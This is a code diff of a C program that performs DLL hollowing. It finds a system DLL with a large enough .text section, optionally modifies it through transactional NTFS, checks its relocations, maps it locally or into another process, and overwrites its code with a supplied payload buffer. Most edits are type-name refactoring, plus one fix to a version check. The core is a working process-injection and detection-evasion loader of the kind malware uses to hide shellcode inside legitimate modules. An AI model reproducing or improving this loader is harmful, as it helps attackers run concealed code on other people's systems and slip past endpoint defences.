@@ -21,15 +21,15 @@ typedef LONG(__stdcall* NTMAPVIEWOFSECTION)(HANDLE, HANDLE, PVOID*, ULONG_PTR, S
 typedef NTSTATUS(__stdcall* NTCREATETRANSACTION)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, LPGUID, HANDLE, ULONG, ULONG, ULONG, PLARGE_INTEGER, PUNICODE_STRING);
 typedef NTSTATUS(__stdcall* RLTCREATEUSERTHREAD)(HANDLE, PSECURITY_DESCRIPTOR, BOOLEAN, ULONG, PULONG, PULONG, PVOID, PVOID, PHANDLE, MY_PCLIENT_ID);
 
-BOOL CheckRelocRange(uint8_t* pRelocBuf, uint32_t dwStartRVA, uint32_t dwEndRVA);
-PVOID GetPAFromRVA(uint8_t* pPeBuf, IMAGE_NT_HEADERS* pNtHdrs, IMAGE_SECTION_HEADER* pInitialSectHdrs, uint64_t qwRVA);
+BOOL CheckRelocRange(PBYTE pRelocBuf, UINT dwStartRVA, UINT dwEndRVA);
+PVOID GetPAFromRVA(PBYTE pPeBuf, IMAGE_NT_HEADERS* pNtHdrs, IMAGE_SECTION_HEADER* pInitialSectHdrs, UINT64 qwRVA);
 
 //
 // Hollower logic
 //
 
-BOOL HollowDll(uint8_t** ppMapBuf, uint8_t** ppRemoteMapBuf, uint64_t* pqwMapBufSize, const uint8_t* pCodeBuf, const uint32_t dwReqBufSize,
-	uint8_t** ppMappedCode, uint8_t** ppMappedRemoteCode, const BOOL bTxF, const BOOL bIsElevated, HANDLE hProcessHandle) {
+BOOL HollowDll(PBYTE* ppMapBuf, PBYTE* ppRemoteMapBuf, UINT64* pqwMapBufSize, const PBYTE pCodeBuf, const UINT dwReqBufSize,
+	PBYTE* ppMappedCode, PBYTE* ppMappedRemoteCode, const BOOL bTxF, const BOOL bIsElevated, HANDLE hProcessHandle) {
 	WIN32_FIND_DATAW		wfd = { 0 };
 	WCHAR					cSearchFilePath[MAX_PATH] = { 0 };
 	WCHAR					cTempPath[MAX_PATH] = { 0 };
@@ -101,7 +101,7 @@ BOOL HollowDll(uint8_t** ppMapBuf, uint8_t** ppRemoteMapBuf, uint64_t* pqwMapBuf
 				HANDLE		hTransaction = INVALID_HANDLE_VALUE;
 				WCHAR		cFilePath[MAX_PATH];
 				NTSTATUS	ntStatus, ntRemoteStatus;
-				uint8_t* pFileBuf;
+				PBYTE		pFileBuf;
 
 				if (bIsElevated) {
 					GetSystemDirectoryW(cFilePath, MAX_PATH);
@@ -151,8 +151,8 @@ BOOL HollowDll(uint8_t** ppMapBuf, uint8_t** ppRemoteMapBuf, uint64_t* pqwMapBuf
 				}
 
 				if (hFile != INVALID_HANDLE_VALUE) {
-					const uint32_t dwFileSize = GetFileSize(hFile, NULL);
-					uint32_t dwBytesRead = 0;
+					const UINT dwFileSize = GetFileSize(hFile, NULL);
+					UINT dwBytesRead = 0;
 
 					pFileBuf = VirtualAlloc(NULL, dwFileSize, MEM_COMMIT, PAGE_READWRITE);
 
@@ -161,7 +161,7 @@ BOOL HollowDll(uint8_t** ppMapBuf, uint8_t** ppRemoteMapBuf, uint64_t* pqwMapBuf
 
 						IMAGE_DOS_HEADER* pDosHdr = (IMAGE_DOS_HEADER*)pFileBuf;
 						IMAGE_NT_HEADERS* pNtHdrs = (IMAGE_NT_HEADERS*)(pFileBuf + pDosHdr->e_lfanew);
-						IMAGE_SECTION_HEADER* pSectHdrs = (IMAGE_SECTION_HEADER*)((uint8_t*)&pNtHdrs->OptionalHeader + sizeof(IMAGE_OPTIONAL_HEADER));
+						IMAGE_SECTION_HEADER* pSectHdrs = (IMAGE_SECTION_HEADER*)((PBYTE)&pNtHdrs->OptionalHeader + sizeof(IMAGE_OPTIONAL_HEADER));
 
 						if (pNtHdrs->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR_MAGIC) {
 							if (dwReqBufSize < pNtHdrs->OptionalHeader.SizeOfImage && (_stricmp((char*)pSectHdrs->Name, ".text") == 0 && dwReqBufSize < pSectHdrs->Misc.VirtualSize)) {
@@ -172,20 +172,20 @@ BOOL HollowDll(uint8_t** ppMapBuf, uint8_t** ppRemoteMapBuf, uint64_t* pqwMapBuf
 								printf("[*] %ws - image size: %lu - .text size: %lu\r\n", wfd.cFileName, pNtHdrs->OptionalHeader.SizeOfImage, pSectHdrs->Misc.VirtualSize);
 
 								BOOL bTxF_Valid = FALSE;
-								uint32_t dwCodeRva = 0;
+								UINT dwCodeRva = 0;
 
 								if (bTxF) {
 									//
 									// For TxF, make the modifications to the file contents now prior to mapping.
 									//
 
-									uint32_t dwBytesWritten = 0;
+									UINT dwBytesWritten = 0;
 
 									//
 									// Wipe the data directories that conflict with the code section
 									//
 
-									for (uint32_t dwX = 0; dwX < pNtHdrs->OptionalHeader.NumberOfRvaAndSizes; dwX++) {
+									for (UINT dwX = 0; dwX < pNtHdrs->OptionalHeader.NumberOfRvaAndSizes; dwX++) {
 										if (pNtHdrs->OptionalHeader.DataDirectory[dwX].VirtualAddress >= pSectHdrs->VirtualAddress && pNtHdrs->OptionalHeader.DataDirectory[dwX].VirtualAddress < (pSectHdrs->VirtualAddress + pSectHdrs->Misc.VirtualSize)) {
 											pNtHdrs->OptionalHeader.DataDirectory[dwX].VirtualAddress = 0;
 											pNtHdrs->OptionalHeader.DataDirectory[dwX].Size = 0;
@@ -197,7 +197,7 @@ BOOL HollowDll(uint8_t** ppMapBuf, uint8_t** ppRemoteMapBuf, uint64_t* pqwMapBuf
 									//
 
 									BOOL bRangeFound = FALSE;
-									uint8_t* pRelocBuf = (uint8_t*)GetPAFromRVA(pFileBuf, pNtHdrs, pSectHdrs, pNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
+									PBYTE pRelocBuf = (PBYTE)GetPAFromRVA(pFileBuf, pNtHdrs, pSectHdrs, pNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
 
 									if (pRelocBuf != NULL) {
 										for (dwCodeRva = 0; !bRangeFound && dwCodeRva < pSectHdrs->Misc.VirtualSize; dwCodeRva += dwReqBufSize) {
@@ -242,7 +242,7 @@ BOOL HollowDll(uint8_t** ppMapBuf, uint8_t** ppRemoteMapBuf, uint64_t* pqwMapBuf
 												*ppMappedRemoteCode = *ppRemoteMapBuf + pSectHdrs->VirtualAddress + dwCodeRva;
 
 												if (!bTxF) {  // Todo: fix remote
-													uint32_t dwOldProtect = 0;
+													UINT dwOldProtect = 0;
 
 													if (VirtualProtect(*ppMappedCode, dwReqBufSize, PAGE_READWRITE, (PDWORD)&dwOldProtect)) {
 														memcpy(*ppMappedCode, pCodeBuf, dwReqBufSize);
@@ -300,10 +300,10 @@ BOOL HollowDll(uint8_t** ppMapBuf, uint8_t** ppRemoteMapBuf, uint64_t* pqwMapBuf
 // Helpers
 //
 
-IMAGE_SECTION_HEADER* GetContainerSectHdr(IMAGE_NT_HEADERS* pNtHdrs, IMAGE_SECTION_HEADER* pInitialSectHeader, uint64_t qwRVA) {
-	for (uint32_t dwX = 0; dwX < pNtHdrs->FileHeader.NumberOfSections; dwX++) {
+IMAGE_SECTION_HEADER* GetContainerSectHdr(IMAGE_NT_HEADERS* pNtHdrs, IMAGE_SECTION_HEADER* pInitialSectHeader, UINT64 qwRVA) {
+	for (UINT dwX = 0; dwX < pNtHdrs->FileHeader.NumberOfSections; dwX++) {
 		IMAGE_SECTION_HEADER* pCurrentSectHdr = pInitialSectHeader;
-		uint32_t dwCurrentSectSize;
+		UINT dwCurrentSectSize;
 
 		pCurrentSectHdr += dwX;
 
@@ -322,39 +322,39 @@ IMAGE_SECTION_HEADER* GetContainerSectHdr(IMAGE_NT_HEADERS* pNtHdrs, IMAGE_SECTI
 	return NULL;
 }
 
-PVOID GetPAFromRVA(uint8_t* pPeBuf, IMAGE_NT_HEADERS* pNtHdrs, IMAGE_SECTION_HEADER* pInitialSectHdrs, uint64_t qwRVA) {
+PVOID GetPAFromRVA(PBYTE pPeBuf, IMAGE_NT_HEADERS* pNtHdrs, IMAGE_SECTION_HEADER* pInitialSectHdrs, UINT64 qwRVA) {
 	IMAGE_SECTION_HEADER* pContainSectHdr;
 
 	if ((pContainSectHdr = GetContainerSectHdr(pNtHdrs, pInitialSectHdrs, qwRVA)) != NULL) {
-		const uint32_t dwOffset = (qwRVA - pContainSectHdr->VirtualAddress);
+		const UINT dwOffset = (qwRVA - pContainSectHdr->VirtualAddress);
 
 		if (dwOffset < pContainSectHdr->SizeOfRawData)
 		{
 			// Sections can be partially or fully virtual. Avoid creating physical pointers that reference regions outside of the raw data in sections with a greater virtual size than physical.
-			return (uint8_t*)(pPeBuf + pContainSectHdr->PointerToRawData + dwOffset);
+			return (PBYTE)(pPeBuf + pContainSectHdr->PointerToRawData + dwOffset);
 		}
 	}
 
 	return NULL;
 }
 
-BOOL CheckRelocRange(uint8_t* pRelocBuf, uint32_t dwStartRVA, uint32_t dwEndRVA) {
+BOOL CheckRelocRange(PBYTE pRelocBuf, UINT dwStartRVA, UINT dwEndRVA) {
 	IMAGE_BASE_RELOCATION* pCurrentRelocBlock;
-	uint32_t dwRelocBufOffset, dwX;
+	UINT dwRelocBufOffset, dwX;
 	BOOL bWithinRange = FALSE;
 
 	for (pCurrentRelocBlock = (IMAGE_BASE_RELOCATION*)pRelocBuf, dwX = 0, dwRelocBufOffset = 0; pCurrentRelocBlock->SizeOfBlock; dwX++) {
-		const uint32_t dwNumBlocks = ((pCurrentRelocBlock->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(uint16_t));
-		uint16_t* pwCurrentRelocEntry = (uint16_t*)((uint8_t*)pCurrentRelocBlock + sizeof(IMAGE_BASE_RELOCATION));
+		const UINT dwNumBlocks = ((pCurrentRelocBlock->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(uint16_t));
+		uint16_t* pwCurrentRelocEntry = (uint16_t*)((PBYTE)pCurrentRelocBlock + sizeof(IMAGE_BASE_RELOCATION));
 
-		for (uint32_t dwY = 0; dwY < dwNumBlocks; dwY++, pwCurrentRelocEntry++) {
+		for (UINT dwY = 0; dwY < dwNumBlocks; dwY++, pwCurrentRelocEntry++) {
 #ifdef _WIN64
 #define RELOC_FLAG_ARCH_AGNOSTIC IMAGE_REL_BASED_DIR64
 #else
 #define RELOC_FLAG_ARCH_AGNOSTIC IMAGE_REL_BASED_HIGHLOW
 #endif
 			if (((*pwCurrentRelocEntry >> 12) & RELOC_FLAG_ARCH_AGNOSTIC) == RELOC_FLAG_ARCH_AGNOSTIC) {
-				const uint32_t dwRelocEntryRefLocRva = (pCurrentRelocBlock->VirtualAddress + (*pwCurrentRelocEntry & 0x0FFF));
+				const UINT dwRelocEntryRefLocRva = (pCurrentRelocBlock->VirtualAddress + (*pwCurrentRelocEntry & 0x0FFF));
 
 				if (dwRelocEntryRefLocRva >= dwStartRVA && dwRelocEntryRefLocRva < dwEndRVA) {
 					bWithinRange = TRUE;
@@ -363,7 +363,7 @@ BOOL CheckRelocRange(uint8_t* pRelocBuf, uint32_t dwStartRVA, uint32_t dwEndRVA)
 		}
 
 		dwRelocBufOffset += pCurrentRelocBlock->SizeOfBlock;
-		pCurrentRelocBlock = (IMAGE_BASE_RELOCATION*)((uint8_t*)pCurrentRelocBlock + pCurrentRelocBlock->SizeOfBlock);
+		pCurrentRelocBlock = (IMAGE_BASE_RELOCATION*)((PBYTE)pCurrentRelocBlock + pCurrentRelocBlock->SizeOfBlock);
 	}
 
 	return bWithinRange;
@@ -381,11 +381,11 @@ INT main() {
 	HANDLE					hProcessToken = NULL;
 	HANDLE					hProcessHandle = NULL;
 	HANDLE					hTargetThreadHandle = NULL;
-	uint8_t* pMapBuf = NULL;
-	uint8_t* pRemoteMapBuf = NULL;
-	uint8_t* pMappedCode = NULL;
-	uint8_t* pMappedRemoteCode = NULL;
-	uint64_t				qwMapBufSize;
+	PBYTE					pMapBuf = NULL;
+	PBYTE					pRemoteMapBuf = NULL;
+	PBYTE					pMappedCode = NULL;
+	PBYTE					pMappedRemoteCode = NULL;
+	UINT64					qwMapBufSize;
 	DWORD					dwPid;
 	STARTUPINFOA			startupInfo;
 	PROCESS_INFORMATION		processInformation;
@@ -409,7 +409,7 @@ INT main() {
 	}
 
 	// Check if TxF is supported
-	if (!IsWindowsVistaOrGreater) {  // Does this really work
+	if (!IsWindowsVistaOrGreater()) {  // Does this really work
 		puts("[*] TxF is not supported\r\n");
 		bTxF = FALSE;
 	}
